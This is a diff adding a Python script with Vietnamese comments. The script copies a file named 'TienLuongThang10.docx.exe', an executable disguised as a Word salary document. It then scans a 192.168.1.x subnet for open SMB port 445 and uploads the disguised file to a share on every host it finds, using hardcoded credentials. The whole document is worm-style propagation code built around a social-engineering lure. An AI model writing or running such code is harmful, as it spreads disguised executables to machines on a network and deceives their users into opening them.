@@ -1,0 +1,94 @@
+import shutil
+import os
+import socket
+from smb.SMBConnection import SMBConnection
+
+# Version 2.0
+# Made by NDX
+
+# Hàm nhân bản file
+def duplicate_file(source_file):
+    try:
+        # Lấy đường dẫn thư mục gốc của file
+        directory = os.path.dirname(source_file)
+        # Tạo tên thư mục mới
+        new_folder_name = 'DuplicatedFiles'
+        destination_dir = os.path.join(directory, new_folder_name)
+
+        # Tạo thư mục mới nếu chưa tồn tại
+        if not os.path.exists(destination_dir):
+            os.makedirs(destination_dir)
+            print(f"Đã tạo thư mục: {destination_dir}")
+
+        # Nhân bản file
+        new_file_name = os.path.basename(source_file)  # Giữ nguyên tên file gốc
+        destination_file = os.path.join(destination_dir, new_file_name)
+        shutil.copy2(source_file, destination_file)
+        print(f"File đã được sao chép thành công đến {destination_file}")
+        return destination_file  # Trả về đường dẫn file nhân bản
+    except Exception as e:
+        print(f"Không thể sao chép file: {str(e)}")
+        return None
+
+# Hàm kiểm tra cổng SMB (445)
+def check_smb_port(ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)  # Đặt thời gian chờ kết nối là 1 giây
+    try:
+        sock.connect((ip, 445))
+        return True
+    except:
+        return False
+    finally:
+        sock.close()
+
+# Hàm gửi file qua SMB
+def send_file_to_smb(ip, username, password, local_file_path, remote_file_path, share_name='ShareFolder'):
+    try:
+        # Tạo kết nối SMB
+        conn = SMBConnection(username, password, 'MyClient', ip, use_ntlm_v2=True)
+        conn.connect(ip, 445)  # Kết nối SMB qua cổng 445
+
+        # Mở tệp cục bộ và tải lên server SMB
+        with open(local_file_path, 'rb') as file:
+            conn.storeFile(share_name, remote_file_path, file)
+        print(f"Đã gửi file tới {ip}")
+    except Exception as e:
+        print(f"Không thể gửi file tới {ip}: {str(e)}")
+
+# Hàm quét dải IP trong mạng LAN
+def scan_network(start_ip, end_ip):
+    active_machines = []
+    for i in range(start_ip, end_ip + 1):
+        ip = f'192.168.1.{i}'  # Giả sử dải IP là 192.168.1.x
+        if check_smb_port(ip):
+            print(f"Máy chủ SMB phát hiện tại {ip}")
+            active_machines.append(ip)
+        else:
+            print(f"Không có SMB tại {ip}")
+    return active_machines
+
+# Đường dẫn đến file cần nhân bản
+source_file = 'path/to/TienLuongThang10.docx.exe'  # Thay đổi đường dẫn tới file của bạn
+
+# Kiểm tra và nhân bản file
+duplicated_file = duplicate_file(source_file)
+
+# Nếu file đã nhân bản thành công, quét mạng và gửi qua SMB
+if duplicated_file:
+    # Nhập dải IP để quét
+    start_ip = 1  # IP bắt đầu (192.168.1.1)
+    end_ip = 255   # IP kết thúc (192.168.1.255)
+
+    # Quét và liệt kê các máy
+    active_machines = scan_network(start_ip, end_ip)
+
+    # Thông tin xác thực (nếu cần gửi file sau này)
+    username = 'smb_user'  # Tên đăng nhập SMB
+    password = 'smb_password'  # Mật khẩu SMB
+    remote_file_name = os.path.basename(duplicated_file)  # Tên file trên máy đích
+    share_name = 'ShareFolder'  # Tên chia sẻ SMB
+
+    # Gửi file tới từng máy chủ SMB phát hiện
+    for machine in active_machines:
+        send_file_to_smb(machine, username, password, duplicated_file, remote_file_name, share_name)
